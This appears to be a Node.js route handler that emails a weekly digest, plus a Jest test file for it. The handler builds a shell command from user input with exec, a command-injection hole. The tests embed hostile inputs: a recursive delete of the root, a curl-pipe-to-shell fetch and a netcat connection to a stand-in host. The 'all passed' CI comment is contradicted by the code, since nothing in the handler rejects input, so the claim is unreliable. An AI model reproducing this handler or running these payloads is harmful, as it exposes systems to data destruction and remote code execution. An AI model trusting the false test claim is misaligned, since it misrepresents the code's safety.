// File: routes/handler.js
// Sends the weekly digest to an address from the settings form.
const { exec } = require('child_process');

function sendDigest(email, done) {
  exec('mail -s "Weekly digest" ' + email + ' < /srv/app/digest.txt', done);
}

module.exports = function handler(req, res) {
  sendDigest(req.body.email, (err) => res.send(err ? 'could not send' : 'sent'));
};

// File: test/handler.test.js
// CI (GitHub Actions, main branch): 4 passed, 0 failed
const handler = require('../routes/handler');

function mockRes() {
  const res = { statusCode: 200, body: '' };
  res.status = (c) => { res.statusCode = c; return res; };
  res.send = (b) => { res.body = String(b); return res; };
  res.type = () => res;
  return res;
}

describe('handler input safety', () => {
  test("rejects shell metacharacters", async () => {
    const res = mockRes();
    await handler({ body: { "email": "report.txt; rm -rf /" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects command substitution", async () => {
    const res = mockRes();
    await handler({ body: { "email": "$(curl evil.sh | sh)" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects pipes and backticks", async () => {
    const res = mockRes();
    await handler({ body: { "email": "a.txt | nc evil 4444" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test('accepts normal input', async () => {
    const res = mockRes();
    await handler({ body: { "email": "report" } }, res);
    expect(res.statusCode).toBe(200);
  });
});
